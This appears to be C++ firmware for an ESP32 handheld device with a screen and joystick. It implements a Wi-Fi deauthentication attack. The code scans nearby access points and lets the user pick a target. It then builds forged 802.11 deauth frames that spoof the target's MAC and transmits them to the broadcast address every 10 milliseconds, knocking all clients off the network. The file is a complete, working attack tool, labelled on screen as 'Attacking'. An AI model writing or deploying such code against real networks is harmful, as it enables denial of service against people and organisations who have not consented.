#include "wifi_tools.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <TFT_eSPI.h>
#include <menu.h>
#include <screen.h>
#include <joystick.h>

TFT_eSPI* tft_deauth = getTFT();

const int maxNetworks = 10;

char* ssidList[10];          // Up to 10 SSID strings
uint8_t macList[10][6];      // Corresponding MAC addresses
int ssidListCount = 0;       // Number of entries

static char selectedSSID[33] = "";   // max SSID length is 32 + 1
static char selectedMAC[18] = "";    // "xx:xx:xx:xx:xx:xx" + null
static uint8_t targetAPMac[6] = {0}; // actual MAC bytes

static uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
static bool attackRunning = false;
int selectedChannel = 1;


wifi_country_t wifi_country = {
  "GR",
  1,
  13,
  WIFI_COUNTRY_POLICY_MANUAL,
};

// Example: should be called after AP selection
void selectTargetAP(int index) {
  Serial.print("Index passed for target selection: ");
  Serial.println(index);

  if (index < ssidListCount) {
    // Copy SSID to global string
    strncpy(selectedSSID, ssidList[index], sizeof(selectedSSID) - 1);
    selectedSSID[sizeof(selectedSSID) - 1] = '\0';

    // Copy MAC to global variable
    memcpy(targetAPMac, macList[index], 6);

    // Format MAC to printable string
    snprintf(selectedMAC, sizeof(selectedMAC), "%02X:%02X:%02X:%02X:%02X:%02X",
             targetAPMac[0], targetAPMac[1], targetAPMac[2],
             targetAPMac[3], targetAPMac[4], targetAPMac[5]);

    selectedChannel = WiFi.channel(index);  // save the channel

    // Serial debug output
    Serial.print("Selected SSID: ");
    Serial.println(selectedSSID);
    Serial.print("Selected MAC: ");
    Serial.println(selectedMAC);
  } else {
    Serial.println("Invalid AP index");
  }
}

void initDeauthAttack() {
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_country(&wifi_country);  // Ensure full channel range
  // esp_wifi_set_promiscuous(true);
  tft_deauth->fillScreen(TFT_BLACK);
  tft_deauth->setTextColor(TFT_RED);
  tft_deauth->drawString("Deauth mode ready", 20, 40);
}

static void sendDeauth() {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Type: Deauth
    0x3A, 0x01, // Duration
    // Destination (broadcast)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    // Source (AP MAC)
    0, 0, 0, 0, 0, 0,
    // BSSID (AP MAC)
    0, 0, 0, 0, 0, 0,
    0x00, 0x00, // Frag/seq
    0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
  };

  // Fill AP MAC
  memcpy(&deauthPacket[10], targetAPMac, 6); // source
  memcpy(&deauthPacket[16], targetAPMac, 6); // bssid
  Serial.println("[TX] Sending deauth packet...");

  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void startDeauth() {
  initDeauthAttack();
  attackRunning = true;

  tft_deauth->fillScreen(TFT_BLACK);
  tft_deauth->setTextColor(TFT_RED);
  tft_deauth->setTextSize(2);
  tft_deauth->drawString("Attacking:", 20, 40);
  tft_deauth->drawString(selectedSSID, 140, 40);  // SSID
  tft_deauth->drawString("MAC Addr:", 20, 70);
  tft_deauth->drawString(selectedMAC, 140, 70);   // MAC
}

void stopDeauth() {
  attackRunning = false;
  tft_deauth->drawString("Stopped.", 20, 70);

  // clear ssid list
  for (int i = 0; i < ssidListCount; ++i) {
    if (ssidList[i]) {
      free(ssidList[i]);
      ssidList[i] = nullptr;
    }
  }
  ssidListCount = 0;
}

bool isDeauthRunning() {
  return attackRunning;
}

void handleDeauthLoop() {
  static unsigned long lastDeauthTime = 0;
  const unsigned long deauthInterval = 10;

  if (!attackRunning) return;
  
  // Check for LEFT joystick movement
  if (getDirection() == JoystickDirection::LEFT) {
    stopDeauth();                         // Stop the attack
    setMenuState(MenuState::MAIN_MENU);   // Go back to main menu
    return;                               // Exit this loop
  }

  // Timed deauth packet sending
  unsigned long now = millis();
  if (now - lastDeauthTime >= deauthInterval) {
    lastDeauthTime = now;
    sendDeauth();
  }
}


void scanForAPs() {
  WiFi.mode(WIFI_STA);    // Set to station mode
  WiFi.disconnect(true);  // Disconnect from any previous network

  tft_deauth->fillScreen(TFT_BLACK);
  tft_deauth->setTextColor(TFT_GREEN);
  tft_deauth->drawString("Scanning...", 20, 30);

  int n = WiFi.scanNetworks();
  if (WiFi.scanComplete() >= 0) {
    int n = WiFi.scanComplete();
    ssidListCount = min(n, 10);

    if (n == 0) {
      tft_deauth->drawString("No networks found", 20, 60);
    } else {
      for (int i = 0; i < ssidListCount; ++i) {
        // Store SSID
        String ssid = WiFi.SSID(i);
        if (ssidList[i]) free(ssidList[i]);  // Avoid memory leaks
        ssidList[i] = strdup(ssid.c_str());

        // Store BSSID (MAC address)
        uint8_t* bssid = WiFi.BSSID(i);  // Pointer to 6-byte MAC
        memcpy(macList[i], bssid, 6);    // Store into global MAC array
      }

      // Populate menu
      populateSecondaryMenu(ssidList, ssidListCount);
    }

    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
  }
}